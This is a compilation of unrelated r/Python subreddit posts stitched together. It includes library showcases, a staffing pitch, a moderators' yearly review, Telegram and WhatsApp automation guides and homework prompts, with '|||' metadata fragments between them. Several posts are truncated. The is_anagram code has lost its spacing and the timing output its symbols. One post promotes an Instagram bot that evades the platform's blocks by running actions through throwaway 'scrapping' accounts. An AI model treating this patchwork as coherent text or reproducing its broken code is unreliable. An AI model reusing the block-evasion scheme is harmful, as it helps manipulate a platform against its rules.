    from nlprule import Rules, SplitOn, Tokenizer
    
    tokenizer = Tokenizer.load("en")
    rules = Rules.load("en", tokenizer, SplitOn([".", "?", "!"]))
    
    text = (
        "NLPRule can correct grammatical errors through a large number of rules ported from LanguageTool. "
        "Their are many rules which are too obscure for all intensive purposes, but the bulk of them cold be useful."
    )
    rules.correct(text)
    
    # returns: 
    # 'NLPRule can correct grammatical errors through many rules ported from LanguageTool. '
    # 'There are many rules which are too obscure for all intents and purposes, but the bulk of them could be useful.'

It is also quite fast through the Rust backend:

    In [1]: %timeit rules.correct(text) # runs on a single CPU core, it can be safely parallelized
       ...: 
    44.5 ms  300 s per loop (mean  std. dev. of 7 runs, 10 loops each)

My needs are for small apps but I need at times GUI that are pretty advanced (graphs, draggable items, videos, etc...).

It features a GUI and a CLI (swappable), multiple language support, and  what i like to call a custom "cryptodictionary" called FirstLevel. I am new to cryptography so maybe this "criptodictionary" is b\*\*\*\*\*\*t but I thought the idea was cool and it also was a good exercise.

To run the program just run the [`passwords.py`](https://passwords.py) file on the terminal. The program should work fine on Mac and Windows but I haven't tested it on Linux.

If you want to learn more about the dictionary type `printall -d` in the CLI interface (`help` for all the commands), or use the `Visualize` button in the GUI.

One great method I have found is to actively watch and attempt to recreate YouTube tutorials of Python projects. 

One of the biggest bottlenecks that you will run into when learning Python is learning *how* professionals go through the process of coding. Code documentation and GitHub projects are easily obtainable, but it is so much more difficult to understand why the programmer made the choices they made without watching them sit there and build the project from scratch. 

When I say to actively watch, I mean ACTIVELY. Pause. Rewind. Replay. Run the code the person is running. Run some different codes based on your own projects. Really get into the lesson. Save your place and come back to the video. 

An ancillary benefit this has is the fact that you pick up on a lot of stuff that you would not have even known to look up on a search engine.

For me, all I do is JavaScript.

Why?

It's faster than Python when using Node.js, and much more optimized for web - basically all libraries that have something to do with web and especially frontend are in JS.

And for back end it's either JavaScript or Go or something like PHP - Slim, Laravel...

Python is too slow when compared to JavaScript running on Node/Deno. 

So, why use it for webdev? If I want to generate a pdf file or convert some videos I will use a c library for that, meaning I won't be writing such low level code myself.

Is there any advantage of Python for a JavaScript developer?

P.S. I prefer curly braces and dislike indentation for blocks because it's pain in the ass while copy-pasting and sharing code.

I was getting tired and bored of Command-Line Interface so I decided to create a chatbot with a Gui since it was my dream to have a personalized AI (But due to my potato PC I could only build a chatbot).

I was lucky to be stumbled across PySimpleGui since it was very easy to be learned by beginners.

This chatbot is capable to get live weather, news headlines and send emails. You will need to register for FREE to get Weather and News from these websites:

News: [https://newsapi.org/](https://newsapi.org/) and Weather: [https://openweathermap.org/](https://openweathermap.org/)

Copy the given API-Key and enter it in the Settings-Ui in the Menu of the Chatbot's Gui.

You can also customize the output for chatting by editing the intents in the .json file.

So I started a small organization on github to host it and hope for people to share their input and guide me on things I don't know.

I use an old MacBook Pro and viewing RAW images really slows my computer down.

I created a Python script that allows me to quickly view and either keep or discard images:

https://preview.redd.it/ewrdy735du761.png?width=2880&amp;format=png&amp;auto=webp&amp;s=75335f75ead495651c7a92c50f73c241d8da20f9

You give it a path to a folder, it displays the images one-by-one, then you press 'd' or 'k' to discard/keep the image. **It assumes both a JPEG &amp; RAW version exist.** It loads the JPEG version to display since that is less computationally expensive. When discarding it will delete both the JPEG/RAW and when keeping it will only discard the JPEG (leaving only the RAW version).

There are additional options that can be passed to the script (control preview size, enable facial detection, etc...).

It utilizes `click` for parsing command-line arguments, `cv2/imutils` for loading and displaying images, and optionally `dlib` for facial detection.

This script is the first thing I use after moving photos from my memory cards to my computer after shooting. It has helped me discard thousands of photos not worth processing. Hope others find it useful as well (especially those editing on older computer hardware).

I am a corporate attorney that developed a niche working with SaaS startups, software development companies, and directly with senior developers on licensing, regulatory, and data security issues. I'm a self-taught programmer (mostly Node.js, but I am also going through Automate the Boring Stuff with Python and ML, NLP Python courses on Pluralsight). I am the instructor of an Intro to Coding workshop at a top-50 law school that helps law students become conversant in tech matters so that they can better represent software clients. (Just like accounting is the language of business, coding is the language of computers and technology, and attorneys have a difficult time working on software matters if they don't understand the first thing about how software is developed). In law school I worked on a legal staffing startup where I became familiar with the staffing industry. 

With the help of my brother (who is a neurologist and Python data scientist) I am starting a Python staffing agency. Our goal is (i) to make it easy for companies to hire great Python talent, and (ii) provide an exceptional work experience for our Python developers and data scientists. We will do this by providing both staff augmentation services (where we hire the Python developer directly) and direct-hire / permanent placement recruiting services. Instead of spamming developers' inboxes with "spray-and-pray" emails like a lot of agencies do, our plan is to slowly but steadily build out a network of genuine relationships within the Python community. We will pay referral fees where a referral leads to a placement or hire, and we will also pay the candidate $100 if they interview and do not get the job. (We want to make sure we respect the time of the candidates.)

We are looking for experienced Pythonistas to work with us in an advisory capacity. We have several options on how we can compensate you for your time. We are also generally interested in connecting with Python developers and data scientists who are wanting to improve their career. (Market research supports that developers can generally increase their compensation by 10% to 20% if they have worked in their current position for at least two years.) As with other agencies, there is no obligation or commitment on your part if you choose to work with us. We will work with you to understand your career goals and parameters and we'll let you know what opportunities we are able to find for you.

Please let me know if you are interested in speaking with us and I will message you additional details and we can connect directly. I'd also be happy to answer any questions here if there are any. I reviewed the subreddit rules and didn't see anything that might prohibit this post, so I hope the mods will let me know if there is anything I need to change.

TL;DR - I am starting a Python staffing agency and am looking to connect with Python developers and data scientists. We can compensate you in an advisory capacity if you have significant experience, or we will do our best to help you improve your career if you are working as a Python developer or data scientist.

We wanted to post a summary of how 2020 has gone for the subreddit, something which we'll hopefully do in future years as well.

There is no denying that 2020 has been a difficult for a lot of people across the globe.

Exclusively viewing 2020 through the lens of our subreddit, we could easily notice changes from our usual trends. Instead of our typical seasonal spike of question-submissions which we see in January, June, and August, we experienced a large wave of new members in March and a more uniform smear of redditors exploring the python language over the full year.

If you are one of those new members of our community over this past year: Welcome! Python is a fantastic language and we hope you enjoy the journey!

If you've been here for a while, we hope your journey has been enjoyable thus far and constantly something you find fun!

The r/Python subreddit grew a lot this year, and we wanted to reflect on the changes we've made and look at the changes still to come to get a solid sense of the direction we're going and how the community feels overall.

# Growth

## Members

Our increasing growth rate continued through 2020, growing by around 224,000 users, this is up from 170,000 in 2019. At the time of posting we have around 710k subscribers.

[Member count since 2013](https://preview.redd.it/zjz0y0n1x0661.png?width=700&amp;format=png&amp;auto=webp&amp;s=dde1d56b5a74523be26ac2614c6df4f9d5b308fc)

Our member count from 2013 to 2020

In October, we hit the Reddit trending section in October 2020 for the first time since January 2018, alongside r/UnethicalLifeProTips and r/TheBoys

## Posts

Over the last 1,000 posts, the most common flair is "Tutorial" followed by "Intermediate Showcase" and the "Discussion".

[Last 1,000 posts by flair](https://preview.redd.it/v50ny4o2x0661.png?width=1664&amp;format=png&amp;auto=webp&amp;s=052ea90aab74c3c4a16f1e4d65b0a7927853975b)

On average we see \~45 posts per day.

## Flair

This past year we [added flair](https://www.reddit.com/r/Python/comments/euprlf/changes_to_rpython/) and after some months we made an adjustment to the system to help simplify submission types.

Originally we had a collection of flairs that can be broken into two groups. Group 1 you could call "submission type", and group 2 you could call "topic type". The first group would describe what the submission was, "help", "news", "di scussion" while the second described the topic of the submission "Machine Learning", "Editor / IDE's", and so on.

After some time, we noticed that the submissions which used flair describing the submission type were more informative, and submissions which used the topic type varied from help questions to projects to resources. Additionally, the ti tle of the submission usually made the topic of the post clear, making topical flair a touch redundant. (For example submissions flaired with "Editor / IDE's" would have a title, "Which should I use, VSCode or PyCharm").

Because of the redundancy between the submission title and the "topic" group of flair labels, we removed the topic flairs in favor of making the submission type more clear. At the same time, we added the "Tutorial" flair to add clarity in the gray area between showcases and resource flairs.

When we first introduced flair, we had a flair title called, "I Made This" for projects. While how advanced the project was varied, we were very excited to see the projects the members of our community were working on. From there we re ceived feedback about a problem with a number of project which replicated the recently popular project. To address this over the past year we made changes which included breaking up projects into advanced and beginner projects, and the n intermediate and beginner showcases, and forcing all showcases to be text submissions which require both a textual description and a link to the source code on a code host such as github or gitlab.

We dropped the beginner and advanced project flairs in favor of beginner and intermediate showcases because there were frequently comments which stated that a project wasn't sufficiently advanced, or that a beginner project was too adv anced. Because we want to encourage showcasing our communities hobbies and projects, we elected to adjust the flair to reduce those forms of comments. The beginner and intermediate showcases seem to be much better when it comes to comm ents about showcase quality. Adding the term 'showcase' in place of 'projects' helped reduce the couple of posts which would show off an established library such as numpy, and lowered the perceived barrier to entry to make a submission .

In all, we think flair has greatly improved the ability to ensure various kinds of posts are treated appropriately. Showcases cannot be images or videos and must be text submissions, and help submissions get redirected to the discord a nd r/learnpython. In addition to the flair, we've added a couple of pages to our wiki to explain how to filter out posts you don't want to see, as well as fleshed out an explanation of the flair types to clarify their usage.

# Moderation

Around 22% of the last 1,000 post removals were carried out by a human.

[Last 1,000 post removals by moderator](https://preview.redd.it/wvzob2w3x0661.png?width=1664&amp;format=png&amp;auto=webp&amp;s=3feef5580c33e83bb6d0f663caca7af6bf33281c)

This year we've upped our AutoModerator filtering to cut down on help posts by redirecting to r/LearnPython.

[Usage of the \\"Help\\" flair](https://preview.redd.it/wuvmxbk5x0661.png?width=1011&amp;format=png&amp;auto=webp&amp;s=3eb36f87bbd5e6cebc71e76e15ddc15c0cab4b62)

This greatly reduced the number of posts asking questions and helped handle a large volume of submissions (around 25-30 per day).

We took the decision earlier this year to filter out any image, video or link posts for submissions to our showcase flairs. We believe this has improved the quality of projects showcased on our subreddit.

We've also fleshed out the subreddit rules to try improve clarity. We'll eventually automate some enforcement of these new rules, like ensuring that posts under our showcase flair attach some form of source code.

# Megathreads/Daily Threads

We introduced a more advanced megathread system earlier in the year. We will being referring to it as the Daily Thread instead of megathread to more easily distinguish between reoccurring posts, and larger, more 'mega' events. Regardless of their name their function remains the same! This expanded on our existing "what are you working on?" thread that was posted every week by bringing a new topic every day. We felt these topics covered a lot of r/Python's frequent posts which were just common enough to justify grouping together. 

**Monday:** Project ideas  
**Tuesday:** Advanced questions  
**Wednesday:** Beginner questions  
**Thursday:** Careers  
**Friday:** Free chat Friday!  
**Saturday:** Resource sharing  
**Sunday:** What are you working on this week?

Typically you'd find these posts stickied the top of the subreddit, though this post may be taking that space right now!

We would love to hear feedback on our Daily Threads and are open to changing up the topics!

# Looking Towards 2021

We love this community and the python programming language, and we hope the changes we made over 2020 were positive and helped improve the community as a whole. Looking forward to this next year we want to continue making the subreddit a more positive and informative place for everyone to keep tabs on the latest of python: news, projects, information and more.

Our biggest goals for the year to come involve fleshing out and updating our wiki to be more informative, and to having better communication involving community related events and a stronger relationship with those events.

We have been slowly making changes to the sub to improve the experience and make it easier to see the impact of the most recent change. Hopefully the changes we've made are ones which have improved your experience, and we are eager to hear your opinions of the state of the sub.""|||Error with tensorflow|||Python|||1|||2|||1609070116|||""[removed]""|||Help would be awesome!|||Python|||1|||2|||1609069411|||""[removed]""|||Browser Library|||Python|||1|||6|||1609069326|||""Hi  guys, I'm looking for a Python library which allows me to open a tab in  a current Firefox session (like webbrowser) and is also able to get  access to HTML elements (like selenium).

Magic the gathering card extractor! 

[https://github.com/benlevin0224/Scryfall\_to\_Excel](https://github.com/benlevin0224/Scryfall_to_Excel)

I wanted a way to extract all the cards of a certain type and color from magic's history and put them into an excel document to make it easier to sort through and keep track of what I wanted to use. 

I tried to take a pretty straight forward approach, since I tend to over complicate things from time to time. When the code is ran it lets you input the file name you'd like (automatically adds the excel extension), the card type (such as elf, dragon, instant, etc) and the color identity (WUBRG). For those who don't play magic that is white, blue, black, red, green. It will then write the cards name, mana cost, and rules text to the excel sheet.   


**Some problems I encountered:**

* Double faced cards are stored a bit differently than single sided cards so I added a try/except KeyError so I could parse those properly.
* Each page only holds 175 cards, so in order to make sure I am pulling all of the cards I needed to add a check if there was a next\_page key. Again I did this by using try/except Keyerror. 

I know try/except isn't always the best way to do something like this it was the only way I could think of. 

**Features I'd still like to add:**

* Rules text search so one can write only the cards that have "Draw a card" in their text. You can do a pretty simple excel filter for that I would prefer the end user not to have to know excel.

It's my personal attempt at creating a clone of Chrome's famous offline auto-runner using Pygame.|||Python|||1|||3|||1608954052|||""**TL;DR**: I got **a lot** out of making this game. [Here's](https://github.com/FrancisLangit/Bolan.py) a link to the project's GitHub repository.

[Gameplay](https://i.redd.it/mecgfi9dag761.gif)

While it does have it shortcomings, including that of there not being a proper day/night cycle nor any Pterodactyls, the making of Bolan.py was a **tremendous** learning experience. 

After finished the entirety of [Eric Matthes's Python Crash Course](https://nostarch.com/pythoncrashcourse2e), the creation of this game allowed me to deeply apply much of my significant learnings from the book, particularly that of the "Alien Invasion" section. I recommend anyone still learning the ropes to have a go at making a programming project from scratch after they've gotten down the fundamentals of the language they're learning. 

Additionally, for those looking to utilize sprite sheets in their Pygame programs, I'd strongly recommend that you have a look at Eric Matthes's ["Using Sprite Sheets in Pygame" tutorial](https://ehmatthes.github.io/pcc_2e/beyond_pcc/pygame_sprite_sheets/). The class I borrowed from the tutorial helped immensely in utilizing the sprite sheet used by the original game's actual source code. 

With that said, my **sincere** appreciation goes out anyone here who's given this project a look. I'd most definitely be open to any feedback or constructive criticism and will be looking forward to discussions as they happen below. 

Follow [this link](https://github.com/FrancisLangit/Bolan.py) to have a look at the project's GitHub repository. You'll find all of additional details there.""|||Merry Christmas.

I set the minimum price to zero (free!) for my book "A Lisp Programmer Living in Python-Land: The Hy Programming Language". Love Lisp but need to sometimes use Python? I updated the book to a second edition a few months ago and I have changes I am working on for a new release next spring.

Examples include: NLP, knowledge Graph/semantic web, search, web scraping, Flask examples, databases, etc.

I auto-translate all Hy language book examples to Python, so if the examples look interesting but you prefer Python to Lisp, I have you covered!

To be honest, I vastly prefer Common Lisp to Hy (Lisp on top of Python), but I so often need deep learning, Knowledge Graph, NLP, etc. Python libraries that I find myself frequently using Hy.

I'm attempting to rewrite an application from scratch (mostly). The app will be hosted in AWS. The front end and all static data will be in an S3 bucket. The back end API will be ECS Fargate.

I'm writing only the API in python, using flask as the framework (with flask-restful, sqlalchemy, marshmallow). The flask app will be hosted within uWSGI as the web server, listening only on https, with certs installed and checked.

That said, every article/video/post about django/flask/wsgi talk about the nginx &gt; uWSGI &gt; flask/django flow. 

Considering I'm not hosting any static content and only the API with dynamic responses, do I actually need nginx?

Problem is, the classes I had created had very specific purposes, and thus when I used them in type annotations, there was no ambiguity as to what data a given function needed or returned and what properties that data had. So by switching to data frames, my hype hints are now less informative.

If Pandas had more robust type annotations, what properties would one want to be able to annotate for, and how effectively could they be validated outside of a runtime check?

Here's some examples that I've thought of:  
\`\`\`py  
ScoresDataFrame = pd.DataFrame\[index=\['class'\], columns=\['tp', 'fp', 'tn', 'fn'\], indextype=str, dtype=int\]

ClassificationDataFrame = pd.DataFrame\[index=\['class'\], columns=\['precision', 'recall', 'f1'\], indextype=str, dtype=float\]

WeatherDataFrame = pd.DataFrame\[columns=\['day', 'temp'\], dtype=\[datetime, float\]\]  
\`\`\`

The idea then is that each data frame type alias specifies what properties a data frame needs to have at a minimum to be usable in a context where that type alias is used.

There are obviously a lot of possibilities that these examples don't account for, such as what you'd need to know about the shape of the data frame or whether or not the order in which certain series are given matters. I'd be interested to know how others feel about this, as well as whether static analysis could ultimately tell you if the conditions set by a type alias are being met.""|||How we hacked Instagram: a bot for Android phones that's controlled by a Python script on your computer (and is not blocked by Instagram)|||Python|||1|||0|||1608763629|||""This story began a half a year ago, when my girlfriend started a blog in Instagram about Africa. And I was thinking how to help her to get more followers.

[Me and my girlfriend in South Africa](https://preview.redd.it/tlakim74ty661.jpg?width=1280&amp;format=pjpg&amp;auto=webp&amp;s=a3e97d7c0609c527394a64aee251d1f4fbbb5252)

We definitely weren't ready to pay any money to Instagram or any other service because it was a start or coronavirus pandemic and  we didn't know where economy will be in a couple of months.

So, we started with InstaPy, the most popular free and opensource Python script for Instagram automation. It simply makes some actions using your Instagram profile. You can leave the script work and it will like, follow, comment, etc. for hours.

# You can just mind your own business and your audience will slowly, but constantly grow.

But the problem was revealed pretty soon. The thing is that InstaPy uses Instagram browser version. And when you have 12k stars on Github, you become a troublesome fly for Instagram. So, they simply started to block actions after some amount, if they were made from a browser. You could continue using your phone, but in Instagram browser version you saw a "softban"  temporary block to do any actions.

The solution I've found was very simple: why using browser, if we can do absolutely the same in the app? Instagram will never start blocking mobile app users. It's too dangerous for them to block "fair" users that just spend a lot of time in the app.

It took just one day to build a prototype: a simple script that performed liking via official Android UI testing framework. I called it **Insomniac**. We tested it and found out that we really hacked Instagram: our script worked and was bringing audience for free. Instagram didn't block it. So, I added some minimal command line arguments and published it on Github.

[One of the earliest versions of Insomniac \(v1.5.3\). Now it's v3.5.0 and it's capable of much, much more](https://i.redd.it/bh2ddov7ty661.gif)

Here is how Insomniac works: you connect your phone to the computer with a USB cable. Then you use adb tool (adb stands for Android Device Bridge) to establish programmatic connection between the computer and the phone. You can even do it without a USB cable, just using your WiFi network (that's how magic on the gif above works). And then you run the script. That's all  everything else is handled by Insomniac. It works with any device and with emulators as well.

# It's too dangerous for Instagram to block "fair" users that just spend a lot of time in the app.

But never forget that even simple users that make too much likes/comments/follows may be "softbanned". It means that Instagram will temporary forbid them to do specific actions. That's why we implemented "limits"  settings that stop the script at some point for a couple of hours. Then Insomniac automatically opens Instagram app again and continues.

I never made any ads, but audience was constantly growing. People came to the Github page, saw how it works and tried themselves. Then they requested new features  more and more. After a month I found myself working on Insomniac as a part-time job. So I decided to make some paid "extra" features, that are not necessary to get more followers, but make it a bit faster and let you target on a particular audience.

Some users made pull requests on Github. The best PRs were made by a guy who's name is Asaf. Now we are partners, we discuss and implement new features every week.

[Screenshot by one of users: running Insomniac on emulators for 3 accounts simultaneously \(Windows\)](https://preview.redd.it/4xqwdhxety661.png?width=1920&amp;format=png&amp;auto=webp&amp;s=1583cd65670b0b70ef92d78d858ff24a7f0d39de)

The main problem with Insomniac is that it requires some basic skills to start: you have to install Python and adb, use Command Prompt and command line arguments. At this moment we solved this problem by recording a course where we explain all steps in detail. We tried not only to show steps, but also explain what's happening.

So far Insomniac is able to:

* Like, watch stories and follow   so, "interact" with users who are some specific blogger's followers, or are followed by specific user, or liked posts with specific hashtag.
* Unfollow users  all your followings, or only followed by the bot, or only those who didn't follow back
* Filter users by different parameters (followers/following/posts count, language, type of account, etc.)
* Scrape users. This is our know-how: a feature that makes using Insomniac even more safe and effective. You create an additional "scrapping" empty account and instruct the bot to collect (or "scrape") only users who are *your audience* (you find them using filters). Insomniac does the interaction using this "scrapping" account. It may be blocked for making too much actions but you won't worry because it's empty. And then you instruct the bot to interact with these "scraped" users  in your main account. So, you avoid extra profile views and interact with your target audience only, voila!

Create a program to simulate a number lottery. In the lottery, 6 basic numbers from numbers are drawn from 1 to 49 and 2 bonus numbers from numbers 1-9 (numbers are not repeated within one tip or draw). 

 Create a program that: 

\- at the entrance reads tips on 6 numbers from the user + 2 bonus. The user enters numbers in one input line and separate them with spaces - bonus numbers are last two entered  
\- simulates a draw and prints 6 + 2 drawn numbers    
\- compares the drawn numbers with all the tips of the lottery participants and yours. Tips lottery participants are listed in the text file lottery.txt. There is 6+ on each line 2 numbers separated by a space 

 \- write the table "winnings forecasts" 

 \- The  10,000,000 jackpot was won by those who hit all 8 numbers   
\- otherwise (if not all numbers or less than 6 basic numbers are guessed) the win depends on the number of guessed basic numbers as follows:     
\- if the participant guesses x basic numbers, the win is x \* 100.000  \* y, where y is the smaller of the two guessed bonus numbers   
\- so in addition to the jackpot, the highest possible win is  4,800,000 (if he guesses 6 base numbers and the smaller of the two bonus numbers is 8 -&gt; second not guessed correctly), and the lowest win of  100,000 (if he guesses 1 number and the lesser of the bonus is 1) - winning  0 is not a win, but a number We will list bettors who did not guess anything separately below the table   
\- list the table in ascending order according to the number of guessed basic numbers and then descending according to winnings   
\- Do not list amounts that no one has won

 \- if someone won the jackpot, write "jackpot" instead of the word "win" - as on sample output

\- separate the table at the top and bottom with dashes as shown in the example

\- do not list the number of zero winnings and write your winnings below the table  
\- a good solution: store numbers in a matrix - eg rows as a number guessed, columns as a smaller bonus number - Wrong way of solving: in one field the amount of winnings in the other number of winners - it also depends on the number of guessed numbers, ie the one who guesses 1, has a chance to get up to 800,000, and he who guesses 2 can only have 200,000, or these winnings can match, but number of guessed numbers no   
\- also a bad solution: separate fields for the number of guessed numbers 

\- you do not have to deal with invalid entries

\- some tips you might miss: sum (array) - counts all elements in the array

(must be int); .split (); random.shuffle (); .sort (); min (field) - selects

the smallest element in the field; field = field2 \[: 6\] - puts the first 6 elements from field2 into the field

field = field2 \[6:\] - puts all elements from field2 in the field except the first 6

 output example: 

write your tip: 19 24 39 9 43 31 2 3 

drawn numbers: \[49, 15, 10, 25, 3, 1\] \[8, 3\]

A simple script to forward all the messages of one chat (indivisual/group/channel) to another. Made using Telethon. Can be used to back up the contents of a chat to another place.

## 

[Telethon Script](https://preview.redd.it/cx3kvu4fzw661.jpg?width=1280&amp;format=pjpg&amp;auto=webp&amp;s=a43bf7442f0896867f491b4f0b2387a5503d8207)

## Signing in

First of all you need to have your Telegram account's `api_id` and `api_hash`. Learn [how to get](https://docs.telethon.dev/en/latest/basic/signing-in.html) them.

## Installation

* Clone this repo and move into it to get started.

&amp;#8203;

    git clone https://github.com/aahnik/telegram-chat-forward.git &amp;&amp; cd telegram-chat-forward

* Create a virtual environment and install dependencies.

&amp;#8203;

    python3 -m venv venv &amp;&amp; . venv/bin/activate
    pip3 install -r requirements.txt

&gt;Note: For Windows, the process for activating a virtual environment is different, search Google.

## Setup

You must have the `api_id` and `api_hash` as environment variables. You may simply create a file named `.env` in the project directory and paste the following into it.

    api_id=12345
    api_hash=kjfjfk9r9JOIJOIjoijf9wr0w

**Replace the above values with the actual values for your telegram account.**

After this you need to create and fill up the `config.ini` file with your forwarding configurations.

## Configuration

* The `from` and `to` in the `config.ini` has to be a username/phone/link/chat\_id of the chat.
* **To confirm that you are using the correct** `from` **and** `to` **run the** `get_chat_info.py` **script.**
* You may have as many as forwarding pairs as you wish. Make sure to give a unique header to each pair. Follow the syntax shown below.

&amp;#8203;

    [name of forward1]
    ; in the above line give any name as you wish
    ; the square brackets around the name should remain
    from = whatAz
    to = testWha
    offset = 0
    ; the offset will auto-update, keep it zero initially
    [another name]
    ; the name of section must be unique
    from = someone
    to = another
    offset = 0

&gt;**Note**:Any line starting with `;` in a `.ini` file, is treated as a comment.

## Offset

* When you run the script for the first time, keep `offset=0`.
* When the script runs, the value of offset in `config.ini` gets updated automatically.
* Offset is basically the id of the last message forwarded from `from` to `to`.
* When you run the script next time, the messages in `from` having an id greater than offset (newer messages) will be forwarded to  `to`. That is why it is important not to loose the value of `offset`.

## Execution

After setting up the `config.ini`, run the `forwarder.py` script.

    python3 forwarder.py

You have to login for the first time using your phone number (inter-national format) and login code.

A session file called `forwarder.session` will be generated. Please don't delete this and make sure to keep this file secret.

Feel free to ask your questions in the [Discussion section](https://github.com/aahnik/telegram-chat-forward/discussions). For bugs and feature requests use the [issues](https://github.com/aahnik/telegram-chat-forward/issues/new) section of this repo.

## Extra

To get all information about any particular chat:

* Run the script `run_chat_info.py`.
* Open Telegram and send `.id` to any chat to get the chat id.
* Send `.info` to any chat to get details of the chat.
* When you are done, come back to your terminal and press &lt;kbd&gt;CTRL&lt;/kbd&gt; + &lt;kbd&gt;C&lt;/kbd&gt; to stop.""|||How to send a WhatsApp Message with only 3 lines of Python ? Free Forever|||Python|||1|||6|||1608715294|||""WhatsApp is an integral part of our day to day lives. What if you could easily automate the process of sending WhatsApp messages with only 3 lines of code ? Don't worry. I am not writing about any paid API or service.

All you need is Google Chrome and Chrome Driver (same or compatible versions of both)

First of all, if you want to follow along, open your Python interactive shell. But before that, just `pip install wappdriver.`

    
    from wappdriver import WhatsApp
    with WhatsApp() as bot:
         bot.send('aahnik',  # name of recipient
                  'hi send by a bot')  # message
        # The name of the recipient should be in your contacts

When you will run this code for the first time, you will be prompted to enter the path of Chrome Driver Installation. You will also need to scan the QR Code, to sign in to WhatsApp web for the first time. 

And thats it! You have successfuly sent your first message. 

`wappdriver` is open source, [https://github.com/aahnik/wappdriver](https://github.com/aahnik/wappdriver)

Two strings are anagrams if you can make one from the other by rearranging the letters.

Write a function named is\_anagram  
 that takes two strings as its parameters. Your function should return **True**  
 if the strings are anagrams, and **False**  
 otherwise.

For example, the call is\_anagram("typhoon", "opython")  
 should return **True**  
 while the call is\_anagram("Alice", "Bob")  
 should return **False**  


**Code:**

defis\_anagram(word\_1,word\_2):  
foriinword\_1:  
ifiinword\_2==False:  
return False  
foriinword\_2:  
ifiinword\_1==False:  
return False  
 return True

* Python libraries
* APIs
* Front-end webapps (tutorials)
* Broad (non-code) documentation

It'll be hosted through GitLab Pages, and I'm looking for something with decent aesthetics so I can share with non-technical folks and developers alike. I've looked at Sphinx and MkDocs, and I'm wondering if there's a strong set of pros and cons for either ([this page](https://github.com/encode/httpx/discussions/1220) in particular was helpful, but seemed inconclusive).

For Sphinx, it seems like the effort to write up appropriately formatted docstrings is a little higher than with MkDocs (with the mkdocstrings plugin), the aesthetic leaves a *lot* to be desired and it doesn't seem flexible to allow for non-code-documentation pages, so I was using GitBook and hosting tutorials in a separate repo (not great).

MkDocs seems to resolve a lot of this, but I'm reading that it doesn't generate great documentation for APIs, that there's a strong preference among developers for Sphinx, and that RST is preferable/more flexible than MD.

As above-mentioned, I wrote my first script that will read any data from my router like which devices are active/inactive per Wi-Fi or Ethernet and send it to me per e-mail.

The script works only if I run it on a device that is connected with my router. I don't know how to run it remotely, but I came up with an idea:

I could expand the script so it will scan for my inbox and trigger the e-mail once a specific e-mail has received. For example: I would send an e-mail to my e-mail with the word "send router data" and if the python script detects an email including these words, it should trigger to send the e-mail.

Well, if my idea isn't delusional and possible to make. If it is possible, I think I could do it.

Hi people, I write this post to share a portfolio optimization library that I developed called Riskfolio-Lib. This library was designed to help investment managers to run complex portfolio optimization models like: CVaR, CDaR, Omega Ratio, Worst Case, Risk Parity, among others; without effort. Also, it allows to include any kind of linear constraints that are require by clients or regulators like constraints on asset classes, countries, risk factors, concentration, industry, among others.

Some of key functionalities that Riskfolio-Lib offers:

* Portfolio optimization with 4 objective functions (Minimum Risk, Maximum Return, Maximum Risk Adjusted Return Ratio and Maximum Utility Function)
* Portfolio optimization with 10 convex risk measures (Std. Dev., MAD, CVaR, Maximum Drawdown, among others)
* Risk Parity Portfolio optimization with 7 convex risk measures (Std. Dev., MAD, CVaR, Maximum Drawdown, among others)
* Worst Case Mean Variance Portfolio optimization.
* Portfolio optimization with Black Litterman model.
* Portfolio optimization with Risk Factors model.
* Portfolio optimization with constraints on tracking error and turnover.
* Portfolio optimization with short positions and leveraged portfolios.
* Tools for build efficient frontier for 10 risk measures.
* Tools for build linear constraints on assets, asset classes and risk factors.
* Tools for build views on assets and asset classes.
* Tools for calculate risk measures.
* Tools for calculate risk contributions per asset.
* Tools for calculate uncertainty sets for mean vector and covariance matrix.
* Tools for estimate loadings matrix (Stepwise Regression and Principal Components Regression).
* Tools for visualizing portfolio properties and risk measures.

As a data scientist, I often used to look out for external data sources that could be relevant to my core field but there was always a problem to find open-source data sets that do corresponds to what you are looking for at a level of perfection or free Application Programming Interfaces that would give you access to data. In this case, web scraping could be one of the modern technology solutions to get more data.

**What is web scraping?**

Web scraping is all about collecting unstructured data available on websites. This could be achieved manually by a human user or by the use of technology. The latter could of course gather data much faster as compared to human users and that is why we are going to focus on this. Is it therefore technically possible to collect all the data of a website within a couple of minutes?. However, the legality of this practice is not well defined. Websites usually describe in their terms of use and in their robots.txt file whether they allow scrapers or not.

* improved readability by separating work into multiple functions

I suppose you are all familiar with the pattern:

    PS C:\path_to_my\project&gt; python -m venv venv
    PS C:\path_to_my\project&gt; .\venv\Scripts\activate
    (venv) PS C:\path_to_my\project&gt;

I used this pattern a lot, but had a need to keep my virtual environments away from the project folder(s). I searched for a tool for it and since there were none that I would felt okay with, I created a simple tool of my own. This weekend I have spent polishing (&amp; documenting) it, and here it is: [venvlink](https://github.com/np-8/venvlink). In a nutshell:

* It creates virtual environment outside your project folder, to a centralized location using `python -m venv myproj`
* It creates a proxy ("link") `activate` script on your project folder, so the virtual environment is still activated with `.\venv\Scripts\activate`.

https://preview.redd.it/8xzsu6tp4e661.png?width=747&amp;format=png&amp;auto=webp&amp;s=cb2a4a046e3354381b5596ca86f9765b3f8debe5

I have highlighted many potential motivations on using such a tool in the GitHub [README.md](https://github.com/np-8/venvlink), but to pick a few:

* It keeps virtual environment files outside automatic backups (Dropbox, OneDrive, ..)
* It provides possibility to keep your virtual environments on one location, but still activate them without need to remember their names, with the good ol' `.\venv\Scripts\activate` script.
* It gives the possibility to share/reuse virtual environments easily.

I have been using the tool myself for about 1.5 months or so, and since I noticed it improved my development experience, I thought of creating good documentation for it and sharing it with the open source community. For now, it only supports Windows, since I am Windows user, but I suppose cross-platform support could be doable in the future.

I would be happy to hear any comments/thoughts on the project.""|||Is there a better GUI framework for Python than tkinter?|||Python|||1|||16|||1608490839|||""I'm trying to make tkinter work, but even the easiest stuff like automatic resizing of a button involves enormous boilerplate code.

- SMILES to image conversion in a way that can be parallelized.
- I have 2300000 SMILES to train on and I am not sure how to train with RAM that cannot hold such a large number of even very small images

I wanted to share my opinion with all of you, i am a nineteen year old datasci student and previously i attended a cisco course where i worked with java, html, css, javascript which by far, in my mind java is the most mangled and non-beginner friendly language. its a very disgusting language and im sure the lads over at r/java would disagree. 

I have only been with python for about 2.5 years. and i can tell you for a fact that its the most relaxing language/thing i have ever done. heck this beats asmr (not that im into it). can i marry python? 

the IDE i started with was Notepad++ for a long time starting with java, then i moved to Atom for a few months and lastly I'm sticking with VSCode. I internwine using it with Anaconda tools and i absolutely love it.

* *PNG Captions*
* *Video  GIF*
* *GIF size optimization*
* *Multiple GIF services support (i.a. Giphy, Tenor, Gfycat, etc.)*

